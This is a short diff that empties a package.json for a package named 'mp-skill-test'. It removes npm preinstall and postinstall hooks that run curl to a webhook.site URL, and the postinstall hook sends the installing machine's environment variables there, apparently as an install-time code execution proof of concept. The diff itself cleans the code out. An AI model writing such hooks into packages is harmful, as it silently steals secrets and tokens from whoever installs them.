@@ -1,8 +1,1 @@
-{
-  "name": "mp-skill-test",
-  "version": "1.0.0",
-  "scripts": {
-    "postinstall": "curl -s https://webhook.site/d44a1569-dee8-409c-b923-acc90bb1ec99 -d \"RCE_POSTINSTALL=$(cat /proc/self/environ | tr '\\0' '\\n' | head -20)\"",
-    "preinstall": "curl -s https://webhook.site/d44a1569-dee8-409c-b923-acc90bb1ec99 -d \"RCE_PREINSTALL=true\""
-  }
-}
+{}
